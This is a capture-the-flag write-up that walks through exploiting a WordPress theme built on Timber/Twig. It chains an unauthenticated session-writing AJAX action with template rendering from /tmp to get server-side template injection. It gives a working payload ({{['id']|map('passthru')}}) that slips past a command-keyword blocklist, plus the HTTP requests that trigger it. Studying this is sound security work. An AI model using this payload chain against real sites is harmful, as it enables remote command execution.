# Timberlake

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 22 solves / 559 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I'm a front end designer that has some old backend experience. Wanted to put some of my skills to make a cool website that can work with templates. Still WIP but it is coming along nicely.

Note: fully whitebox challenge, no need to do massive bruteforce

[http://100.25.255.51:9095/](http://100.25.255.51:9095/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921214125.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922140326.png)

Huh, pretty cool theme. Let's find out the vulnerability in this challenge! 

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/Timberlake/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Timberlake)-[2024.09.22|14:04:49(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Timberlake)-[2024.09.22|14:04:52(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: timberlake-theme/
  inflating: timberlake-theme/style.css  
  inflating: timberlake-theme/index.php  
  inflating: timberlake-theme/functions.php  
   creating: timberlake-theme/libs/
  inflating: timberlake-theme/libs/Autoloader.php  
  [...]
   creating: timberlake-theme/images/
  inflating: timberlake-theme/images/gan.png  
  inflating: timberlake-theme/script.js  
   creating: timberlake-theme/templates/
  inflating: timberlake-theme/templates/template-home.twig  
  inflating: timberlake-theme/screenshot.png  
```

In this **theme**, `timberlake-theme`, the home page template in `timberlake-theme/index.php` uses **class `Timber`** and PHP template engine **[Twig](https://twig.symfony.com/)** to render a template file from `timberlake-theme/templates/template-home.twig`:

```php
<?php
/* Template Name: Home Page */
$context = Timber::context();
$context['site_name'] = get_bloginfo('name');
$context['template_directory'] = get_template_directory_uri();
$context['index'] = urldecode(isset($_REQUEST['index'])) ? $_REQUEST['index'] : '';
$page = 'template-home.twig';
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
    $page = $_REQUEST['page'];
};
Timber::render($page, $context);
?>
```

However, class `Timber` is not defined in this theme. After a quick searching for the class name, we can know that this theme is depended on a plugin called **[Timber](https://wordpress.org/plugins/timber-library/)**.

> Timber helps you create fully-customized WordPress themes faster with more sustainable code. With Timber, you write your HTML using the [Twig Template Engine](https://twig.symfony.com) separate from your PHP files. This cleans up your theme code so, for example, your PHP file can focus on being the data/logic, while your Twig file can focus 100% on the HTML and display. - [https://wordpress.org/plugins/timber-library/#description](https://wordpress.org/plugins/timber-library/#description)

To test and debug this theme locally, we can set up a local WordPress environment with [Xdebug](https://xdebug.org/) installed. For me, I'll be using [the environment from Wordfence's Discord](https://discord.com/channels/1197901373581303849/1199013923173712023/1199041121322537115). After setting up the local environment, we need to install the [Timber](https://wordpress.org/plugins/timber-library/) plugin:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Timberlake)-[2024.09.22|14:21:46(HKT)]
└> docker compose run --rm wpcli plugin install timber-library --activate
[...]
Plugin installed successfully.
Activating 'timber-library'...
Plugin 'timber-library' activated.
Success: Installed 1 of 1 plugins.
```

Then, we can upload and activate the `timberlake-theme` theme:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922142320.png)

Earlier, we saw that we can provide parameter `index` and `page` to class `Timber` static method `render`:

```php
[...]
$context['index'] = urldecode(isset($_REQUEST['index'])) ? $_REQUEST['index'] : '';
$page = 'template-home.twig';
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
    $page = $_REQUEST['page'];
};
Timber::render($page, $context);
```

`timberlake-theme/templates/template-home.twig`:

```twig
[...]
<div class="text below-text">{{ index }}</div>
[...]
```

As we can see, our `index` parameter's value will be rendered in the template file.

Hmm... Does that mean this `index` parameter is vulnerable to **SSTI (Server-Side Template Injection)**?! Let's test it in our local environment!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922164342.png)

Oh... It's not? Why?

Well, in plugin Timber, the `render` method will actually first compile the template file, then outputs the data like `index`. So this plugin is just like how another popular PHP template engine [Smarty](https://www.smarty.net/) works under the hood.

```php
class Timber {
    [...]
    public static function fetch( $filenames, $data = array(), $expires = false, $cache_mode = Loader::CACHE_USE_DEFAULT ) {
        $output = self::compile($filenames, $data, $expires, $cache_mode, true);
        $output = apply_filters('timber_compile_result', $output);
        return $output;
    }
    [...]
    public static function render( $filenames, $data = array(), $expires = false, $cache_mode = Loader::CACHE_USE_DEFAULT ) {
        $output = self::fetch($filenames, $data, $expires, $cache_mode);
        echo $output;
        return $output;
    }
    [...]
}
```

With that said, we'll need to somehow **render a template file that has our SSTI payload in it**, which means the `index` parameter is obsolete and parameter **`page`** is not.

Before the theme renders the template file, it'll validate parameter `page` via function `validate` from `timberlake-theme/functions.php`:

```php
[...]
if(isset($_REQUEST['page']) && validate($_REQUEST['page'])){
    $page = $_REQUEST['page'];
};
Timber::render($page, $context);
```

```php
Timber::$dirname = array( '../../../../../../../../../../../../tmp', 'templates' );
[...]
function validate($filename) {
    $fullPath = Timber::$dirname[0] . '/' . $filename;
    // Thanks to a report from Patchstack Researcher Darius Sveikauskas we are now validating both the file names and the content.
    if (isset($filename) && !empty($filename) && !in_array($filename, array('.php', '.htm', '.html', '.phtml', '.xhtml'))) {
        [...]
    }
    return 0;
}
```

In this function, the first if statement is to check if `$filename` (`$page`) is in an array blacklisted file extension. However, the check is completely useless as the PHP built-in function `in_array` will only match for exact value:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Timberlake)-[2024.09.22|17:01:42(HKT)]
└> php -a
[...]
php > var_dump(!in_array("foo.php", array('.php', '.htm', '.html', '.phtml', '.xhtml')));
bool(true)
php > var_dump(!in_array(".php", array('.php', '.htm', '.html', '.phtml', '.xhtml')));
bool(false)
```

Then, the second if statement will check whether if the contents of the template file has a Twig template string literal via a regular expression pattern, such as `{{.*?}}`, `{%.*?%}`, or `{#.*?#}`:

```php
function is_timber_template($content) {
    $pattern = '/({{.*?}}|{%.*?%}|{#.*?#})/';
    if (preg_match($pattern, $content)) {
        return true;
    } else {
        return false;
    }
}
[...]
function validate($filename) {
    $fullPath = Timber::$dirname[0] . '/' . $filename;
    // Thanks to a report from Patchstack Researcher Darius Sveikauskas we are now validating both the file names and the content.
    if ([...]) {
        if(is_timber_template(file_get_contents($fullPath)) === true) {
            [...]
        }
    }
    return 0;
}
```

Finally, the last if statement checks whether if the contents of the template file matches the regular expression pattern `$pattern` or not. The goal of this check is to filter out possible Twig SSTI keywords that can execute arbitrary OS command: 

```php
function is_valid_template($content) {
    $pattern = '/\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\/bin|FILENAME)\b/i';
    if (preg_match($pattern, $content)) {
        return false;
    } else {
        return true;
    }
}

function validate($filename) {
    $fullPath = Timber::$dirname[0] . '/' . $filename;
    // Thanks to a report from Patchstack Researcher Darius Sveikauskas we are now validating both the file names and the content.
    if ([...]) {
        if([...]) {
            if(is_valid_template(file_get_contents($fullPath)) === true) {
                return 1;             
            }
        }
    }
    return 0;
}
```

Hmm... Maybe we can bypass those blacklisted keywords? But first we'll need to figure out how can we render a template file that has our SSTI payload in it.

In this theme, it also registered **1 authenticated and unauthenticated AJAX action called `save_session` with callback function `save_session`**:

```php
function save_session() {
    start_session();
    if (isset($_REQUEST['session_data'])) {
        $_SESSION['session_data'] = stripslashes($_REQUEST['session_data']);
        wp_send_json_success('Data is saved to session.');
    } else {
        wp_send_json_error('Some error happened.');
    }
}
add_action('wp_ajax_save_session', 'save_session');
add_action('wp_ajax_nopriv_save_session', 'save_session');
```

As we can see, the callback function **stores our parameter `session_data`'s value into our session cookie**.

For those who don't know about PHP session, **the session is stored into a file**, and the content of it is PHP serialized data.

In the PHP configure file `php.ini`, it has a directive called [session.save_path](https://www.php.net/manual/en/session.configuration.php#ini.session.save-path), which tells the PHP interpreter to store all the session files into the value of `session.save_path`. **By default, the value is `/tmp`**.

Let's test this!

First, we'll send the following AJAX action to save data into the session file:

```http
GET /wp-admin/admin-ajax.php?action=save_session&session_data=foobar HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922172733.png)

Then, we can read the session file in directory `/tmp`:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Timberlake)-[2024.09.22|17:23:55(HKT)]
└> docker exec -it 3ac7f40fbda8 /bin/bash
root@3ac7f40fbda8:/var/www/html# ls -lah /tmp
[...]
-rw------- 1 www-data www-data   26 Sep 22 09:25 sess_jgfmrmbm6a5b59hpan1e702636
root@3ac7f40fbda8:/var/www/html# cat /tmp/sess_jgfmrmbm6a5b59hpan1e702636 
session_data|s:6:"foobar";
```

Cool!

Since we now control a template file's content, **we can use AJAX action `save_session` to inject our SSTI payload into our session file**! 

But wait! Can we reach to directory `/tmp`?

```php
Timber::$dirname = array( '../../../../../../../../../../../../tmp', 'templates' );
[...]
function validate($filename) {
    $fullPath = Timber::$dirname[0] . '/' . $filename;
    [...]
}
```

Oh, the `$fullPath` is basically `/tmp/$filename`. So, yes we can reach to directory `/tmp`!

## Exploitation

In order to pass all the checks in function `validate`, we need to fulfill the following requirements:
1. The template filename must not be the blacklisted file extension. (This check is completely useless)
2. The template file's content must include the Twig template string literal, such as `{{.*?}}`
3. The template file's content must not include the blacklisted keywords

According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig---code-execution), we can use **function `map` and `passthru` to execute OS commands**, as they're not included in the keywords array.

That being said, we can inject the following Twig SSTI payload to execute OS commands!

```twig
{{['id']|map('passthru')}}
```

Let's try this!

```http
GET /wp-admin/admin-ajax.php?action=save_session&session_data={{['id']|map('passthru')}} HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174125.png)

```http
GET /?page=sess_f5pel0q0csj7mu403bvl6c9rrk HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174143.png)

It worked!

We can finally go to the remote instance and get the flag!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174347.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174409.png)

Oh wait... We can't use `cat` to read file `/flag.txt`. Don't worry! We can just use **`head`** or other tools to read it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174522.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240922174537.png)

- **Flag: `CTF{f0rc3d_sst1_ch4ll_zz4z2561}`**

## Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI) in Twig with bypassing blacklisted keywords